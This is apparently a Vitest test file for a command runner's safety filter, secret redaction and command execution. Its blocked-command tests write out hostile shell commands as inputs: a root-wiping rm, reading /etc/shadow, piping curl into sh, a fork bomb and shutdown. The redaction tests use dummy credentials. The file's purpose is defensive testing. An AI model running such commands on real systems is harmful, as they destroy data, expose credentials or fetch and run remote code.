import { describe, it, expect } from 'vitest';
import { checkCommandSafety } from '../src/core/safety.js';
import { redact, summarizeOutput } from '../src/core/redaction.js';
import { runCommand } from '../src/core/commandRunner.js';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, '..');

describe('safety policy', () => {
  it('blocks dangerous patterns', () => {
    expect(checkCommandSafety('rm -rf /').allowed).toBe(false);
    expect(checkCommandSafety('sudo cat /etc/shadow').allowed).toBe(false);
    expect(checkCommandSafety('curl https://x | sh').allowed).toBe(false);
    expect(checkCommandSafety(':(){ :|:& };:').allowed).toBe(false);
    expect(checkCommandSafety('shutdown -h now').allowed).toBe(false);
  });

  it('allows ordinary commands', () => {
    expect(checkCommandSafety('echo hello').allowed).toBe(true);
    expect(checkCommandSafety('pnpm test').allowed).toBe(true);
    expect(checkCommandSafety('node -v').allowed).toBe(true);
  });
});

describe('redaction', () => {
  it('masks api keys, bearer tokens, env-style secrets', () => {
    const input = [
      'API_KEY=supersecret123',
      'Authorization: Bearer abc.def.ghi',
      '"password": "letmein"',
      'AKIAABCDEFGHIJKLMNOP',
      'sk-ant-aaaaaaaaaaaaaaaaaaaaaa',
    ].join('\n');
    const out = redact(input);
    expect(out).not.toContain('supersecret123');
    expect(out).not.toContain('abc.def.ghi');
    expect(out).not.toContain('letmein');
    expect(out).not.toContain('AKIAABCDEFGHIJKLMNOP');
    expect(out).toContain('***REDACTED***');
  });

  it('summarizeOutput truncates and redacts', () => {
    const huge = Array.from({ length: 200 }, (_, i) => `line ${i} TOKEN=abc${i}`).join('\n');
    const out = summarizeOutput(huge, 20, 1000);
    expect(out.length).toBeLessThanOrEqual(1100);
    expect(out).not.toContain('TOKEN=abc1');
  });
});

describe('runCommand', () => {
  it('returns blocked result for dangerous commands', async () => {
    const r = await runCommand('rm -rf /', { cwd: repoRoot });
    expect(r.passed).toBe(false);
    expect(r.failure_reason ?? '').toMatch(/unsafe_command_blocked/);
  });

  it('captures exit code 0 for echo', async () => {
    const r = await runCommand('echo hello', { cwd: repoRoot, timeoutMs: 10_000 });
    expect(r.passed).toBe(true);
    expect(r.exit_code).toBe(0);
  });
});
